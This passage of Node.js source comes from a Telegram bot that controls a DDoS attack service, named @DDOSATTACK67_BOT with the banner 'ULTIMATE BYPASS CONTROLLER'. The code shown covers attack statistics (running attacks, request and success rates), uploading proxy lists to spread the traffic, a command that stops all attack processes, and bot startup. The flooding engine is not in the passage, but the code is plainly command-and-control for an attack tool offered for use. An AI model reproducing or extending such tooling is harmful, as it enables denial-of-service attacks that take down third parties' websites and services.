        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *BOT STATISTICS*\n\n` +
        `⚡ *Attacks*\n` +
        `▶️ Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total: ${attacks.size}\n\n` +
        `📥 *Traffic*\n` +
        `📊 Requests: ${formatNumber(totalReqs)}\n` +
        `✅ Success: ${formatNumber(totalSuccess)}\n` +
        `📈 Rate: ${totalReqs > 0 ? Math.round((totalSuccess/totalReqs)*100) : 0}%\n\n` +
        `🔄 *Proxies*\n` +
        `📊 Loaded: ${formatNumber(proxyCount)}\n\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// ========== PROXY MANAGEMENT ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    ctx.reply(
        `📤 *Proxy Upload*\n\n` +
        `Send a \`proxy.txt\` file with one proxy per line.\n\n` +
        `📝 *Format:* \`ip:port\``,
        { parse_mode: 'Markdown' }
    );
});

bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxies...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ *Proxies Loaded*\n\n📊 ${proxies.length} proxies`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            ctx.reply('❌ Upload failed: ' + error.message);
        }
    }
});

// ========== STOP ALL COMMAND ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    
    const count = attacks.size;
    if (count === 0) {
        return ctx.reply('📊 No active attacks');
    }
    
    attacks.forEach((attack) => {
        if (attack.isRunning) {
            attack.process.kill('SIGINT');
        }
    });
    
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
    ctx?.reply('❌ An error occurred').catch(() => {});
});

// ========== START BOT ==========
async function startBot() {
    try {
        await bot.telegram.deleteWebhook();
        await bot.launch();
        console.log('✅ Bot is running with polling!');
        console.log('📱 Send /start to @DDOSATTACK67_BOT');
    } catch (err) {
        console.error('❌ Failed to start bot:', err.message);
        setTimeout(startBot, 10000);
    }
}

startBot();

console.log('\n╔════════════════════════════════════╗');
console.log('║    🔥 ULTIMATE BYPASS CONTROLLER   ║');
console.log('╠════════════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}                 ║`);
console.log(`║  🤖 Bot: @DDOSATTACK67_BOT          ║`);
console.log('╚════════════════════════════════════╝');

// Graceful shutdown
process.once('SIGINT', () => {
    console.log('\n🛑 Shutting down...');
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    console.log('\n🛑 Shutting down...');
    bot.stop('SIGTERM');
    process.exit(0);
});
// Final startup message
console.log('\n╔════════════════════════════════════╗');
console.log('║    🔥 ULTIMATE BYPASS CONTROLLER   ║');
console.log('╠════════════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}                 ║`);
console.log(`║  🤖 Bot: @DDOSATTACK67_BOT          ║`);
console.log('╚════════════════════════════════════╝');